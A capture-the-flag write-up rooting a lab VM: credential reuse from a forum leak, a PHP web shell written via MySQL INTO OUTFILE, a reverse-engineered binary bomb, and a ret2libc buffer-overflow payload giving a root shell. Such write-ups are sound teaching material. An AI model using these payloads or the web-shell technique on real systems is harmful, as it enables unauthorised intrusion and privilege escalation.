# WRITEUP 1

# Network Reconnaissance

## Discovering the Target

We begin by identifying the IP address of the target VM on the local network.

```bash
nmap -sn 192.168.56.0/24
```

The scan reveals three active hosts. The unknown host is:

```
192.168.56.107
```

This is identified as the target machine.

---

## Service Enumeration

Next, we enumerate open ports and running services:

```bash
nmap -sV 192.168.56.107
```

Open services:

* 21/tcp – FTP (vsftpd)
* 22/tcp – SSH
* 80/tcp – HTTP (Apache)
* 443/tcp – HTTPS
* 143/993 – IMAP/IMAPS

This indicates a typical web application server with FTP and mail services.

---

# Web Enumeration

Browsing the web server reveals several interesting directories:

* `/forum/`
* `/phpmyadmin/`
* `/webmail/`

These suggest:

* A forum application
* Database administration panel
* Webmail service

These will be primary attack vectors.

---

# Initial Credential Discovery (Forum)

While browsing the forum [https://192.168.56.3/forum/], a user accidentally leaked credentials in a log.

Discovered credentials:

```
Username: lmezard
Password: !q\]Ej?*5K5cy*AJ
```

Logging into the forum reveals an associated email:

```
laurie@borntosec.net
```

---

# Email Access (Password Reuse)

Since password reuse is common, we attempt login at:

```
https://192.168.56.107/webmail/
```

Using:

```
Email: laurie@borntosec.net
Password: !q\]Ej?*5K5cy*AJ
```

Login succeeds.

Inside the mailbox, we find database credentials:

```
Username: root
Password: Fg-'kKXBj87E:aJ$
```

---

# Database Access via phpMyAdmin

Accessing:

```
https://192.168.56.107/phpmyadmin/
```

We log in as MySQL root.

This grants full database privileges.

---

# Gaining Remote Code Execution

## Why This Works

MySQL supports:

```
SELECT ... INTO OUTFILE
```

This allows writing arbitrary files to disk.

Since the database runs as `www-data`, we can write a PHP shell into a web-accessible directory.

---

## Creating the Web Shell

```sql
SELECT "<?php system($_GET['cmd']); ?>" 
INTO OUTFILE '/var/www/forum/templates_c/shell.php';
```

The directory `templates_c/` is writable because it is used for template caching.

---

## Verifying Command Execution

Access:

```
https://192.168.56.107/forum/templates_c/shell.php?cmd=whoami
```

Output:

```
www-data
```

We now have command execution as `www-data`.

---

# Local Enumeration

From the shell:

```
ls /home
```

Users found:

* lmezard
* laurie
* thor
* zaz

Searching for readable files:

```
find /home -type f -readable 2>/dev/null
```

We find:

```
/home/LOOKATME/password
```

Contents:

```
lmezard:G!@M6f4Eatau{sF"
```

New credentials obtained.

---

# FTP Access (lmezard)

SSH fails with these credentials, but FTP works:

```bash
ftp 192.168.56.107
```

Login successful.

Files found:

* README
* fun

Download both.

```bash
get README fun
```

---

# The “fun” Challenge

The file is a tar archive:

```bash
file fun
```

Extract:

```bash
tar -xvf fun
```

Hundreds of small C fragments appear.

Each file contains ordering hints referencing other files.

---

## Reconstructing the Code

Using script (`concat_fun.sh`) to:

* Extract ordering numbers
* Sort fragments
* Concatenate properly

Produces `fun.c`.

Compile:

```bash
gcc fun.c -o fun
./fun
```

Output:

```
MY PASSWORD IS: Iheartpwnage
Now SHA-256 it and submit
```

Hash it:

```bash
echo -n "Iheartpwnage" | sha256sum
```

Result:

```
330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4
```

---

# SSH as laurie

Using the hash as password:

```bash
ssh laurie@192.168.56.107
```

Login successful.

---

# The Binary Bomb (thor password)

In laurie’s home directory:

```
bomb
README
```

The bomb is a classic reverse engineering challenge with 6 phases.

Each phase validates specific input.

---

## Phase 1

String comparison:

```
Public speaking is very easy.
```

---

## Phase 2

### What the code does

* It reads **six integers** from your input into an array `var_1c[6]` via `read_six_numbers(arg1, &var_1c)`.
* It immediately checks:

```c
if (var_1c[0] != 1) explode_bomb();
```

So the first number **must be 1**.

### The loop constraint

Then it loops `i = 1..5` and computes a `result` intended to reference the previous array element (Binary Ninja produced a weird stack-based expression, but the pattern is standard):

```c
result = (i + 1) * previous_value;
if (var_1c[i] != result) explode_bomb();
```

Interpreted recurrence:

[a[i] = (i+1)\cdot a[i-1]]

### Deriving the six numbers

Start with:

* `a0 = 1`

Then:

* `a1 = 2 * 1 = 2`
* `a2 = 3 * 2 = 6`
* `a3 = 4 * 6 = 24`
* `a4 = 5 * 24 = 120`
* `a5 = 6 * 120 = 720`

**Phase 2 input:**

```
1 2 6 24 120 720
```

---

## Phase 3

### What the code does

It parses three values:

```c
sscanf(arg1, "%d %c %d", &result_1, &var_9, &var_8)
```

So your input must be:

```
<index> <character> <number>
```

It requires all 3 items parse successfully (`<=2` explodes).

### Index constraint

```c
if (result_1 > 7) explode_bomb();
```

So `index` must be `0..7`.

### Switch table behavior

For each case `0..7`:

* It sets `ebx` to an ASCII value (a character).
* It checks `var_8` equals a specific constant.
* After the switch, it checks:

```c
if (ebx == var_9) return;
else explode_bomb();
```

Meaning: **the character you typed must match the case’s expected ASCII char**, and the third integer must match exactly.

### Case mapping (hex → decimal + ASCII)

* Case 0: `ebx=0x71` → `'q'`, and `var_8 == 0x309` → `777`
* Case 1: `ebx=0x62` → `'b'`, and `var_8 == 0x0d6` → `214`
* Case 2: `ebx=0x62` → `'b'`, and `var_8 == 0x2f3` → `755`
* Case 3: `ebx=0x6b` → `'k'`, and `var_8 == 0x0fb` → `251`
* Case 4: `ebx=0x6f` → `'o'`, and `var_8 == 0x0a0` → `160`
* Case 5: `ebx=0x74` → `'t'`, and `var_8 == 0x1ca` → `458`
* Case 6: `ebx=0x76` → `'v'`, and `var_8 == 0x30c` → `780`
* Case 7: `ebx=0x62` → `'b'`, and `var_8 == 0x20c` → `524`

**Any one of these works:**

```
0 q 777
1 b 214
2 b 755
3 k 251
4 o 160
5 t 458
6 v 780
7 b 524
```

---

## Phase 4

### What the code does

It parses a single integer:

```c
sscanf(arg1, "%d", &var_8) == 1 && var_8 > 0
```

So you must enter **one positive integer**.

Then it computes:

```c
result = func4(var_8);
if (result == 0x37) pass; else explode;
```

So we need: [func4(x) = 0x37]
And `0x37` in decimal is 55

### Understanding func4

```c
if (arg1 <= 1) return 1;
return func4(arg1 - 2) + func4(arg1 - 1);
```

This is Fibonacci-style recursion with:

* `F(0)=1`
* `F(1)=1`

So:

* `F(2)=2`
* `F(3)=3`
* `F(4)=5`
* `F(5)=8`
* `F(6)=13`
* `F(7)=21`
* `F(8)=34`
* `F(9)=55`

So `func4(9)=55`.

**Phase 4 input:**

```
9
```

---

## Phase 5

### What the code does

It requires input length exactly 6:

```c
if (string_length(arg1) != 6) explode;
```

Then for each of the 6 characters:

1. Takes the character byte
2. Masks low 4 bits (`& 0xF`)
3. Uses that as an index into a 16-char table:

```c
array = "isrveawhobpnutfg"
```

Then it builds a new 6-character string `var_c` and compares it to `"giants"`:

```c
if (strings_not_equal(var_c, "giants")) explode;
```

So we need the transformation to produce:

```
giants
```

### Table indexing

Index the table (0..15):

```
0:i 1:s 2:r 3:v 4:e 5:a 6:w 7:h 8:o 9:b 10:p 11:n 12:u 13:t 14:f 15:g
```

To produce `"giants"`, we need indices:

* `g` → 15
* `i` → 0
* `a` → 5
* `n` → 11
* `t` → 13
* `s` → 1

So for each input character `c`:
[
(c \ &\ 0xF) = [15, 0, 5, 11, 13, 1]
]

### Choose any characters with those low nibbles

One clean printable choice:

* low nibble `F` → `'o'` (0x6F)
* low nibble `0` → `'p'` (0x70)
* low nibble `5` → `'u'` (0x75)
* low nibble `B` → `'k'` (0x6B)
* low nibble `D` → `'m'` (0x6D)
* low nibble `1` → `'a'` (0x61)

These give indices `[15,0,5,11,13,1]` → `"giants"`.

**Phase 5 input:**

```
opukma
```

---

## Phase 6

### What the code does (high level)

1. Reads six numbers: `var_1c[6]`.
2. Validates:

   * Each number is in `1..6`
   * All numbers are unique (no duplicates)
3. Treats each number as a **position** in a linked list starting at `node1`.

   * For each input `k`, it walks `k-1` times via `next` pointer to select the kth node.
4. Stores those selected nodes into `var_34[6]`.
5. Relinks them in that exact order (builds a new list).
6. Checks the new list is sorted **descending** by node value.

### Input validation

```c
if (var_1c[i] - 1 > 5) explode;   // means var_1c[i] must be 1..6
if any duplicates explode;
```

So input must be a permutation of `1 2 3 4 5 6`.

### Node values you provided

* node1 (index 1): 253
* node2 (index 2): 725
* node3 (index 3): 301
* node4 (index 4): 997
* node5 (index 5): 212
* node6 (index 6): 432

### The ordering constraint

This is the critical check:

```c
result = *esi_6;               // current node value
if (result < *esi_6[2]) explode_bomb(); // compare to next node value
```

Interpreting intent: for each adjacent pair:
[
value(current) \ge value(next)
]
So the new list must be **descending**.

### Sort nodes by value (descending)

Values descending:

1. 997 → node4
2. 725 → node2
3. 432 → node6
4. 301 → node3
5. 253 → node1
6. 212 → node5

So the input must specify their indices in that order.

**Phase 6 input:**

```
4 2 6 3 1 5
```

---


## Final Combined Password (thor)

Concatenating phase results (no spaces):

```
Publicspeakingisveryeasy.126241207201b2149opukma426135
```

Login as thor successful.

---

# Logo (zaz Password)

In thor’s directory, a Logo turtle file is found.

After correcting syntax (`turtle.logo`) and executing in a Logo interpreter, the drawing spells:

```
SLASH
```

Hash it:

```bash
echo -n "SLASH" | md5sum
```

Result:

```
646da671ca01bb5d84dbb5fb2238dc8e
```

Login as zaz successful.

---

# Final Level – exploit_me (Root)

Binary:

```
-rwsr-s--- 1 root zaz exploit_me
```

This is a 32-bit setuid root binary.

---

## Vulnerability

The program:

```c
char str[128];
strcpy(str, argv[1]);
```

No bounds check → stack buffer overflow.

---

## Exploit Strategy: ret2libc

We overwrite the saved return address with `system()` address.


## Finding system() address

Using GDB:

```
p system
```

---

## Finding "/bin/sh"

Using GDB:

```
find &system,+99999999,"/bin/sh"
```

This searches inside libc.

---

## Final Payload

```bash
python -c 'print "A"*140 + "\xb7\xe6\xb0\x60"[::-1] + "XXXX" + "\xb7\xf8\xcc\x58"[::-1]'
```

Execution:

```
./exploit_me $(<payload>)
```

Result:

```
# whoami
root
```

Root shell obtained.
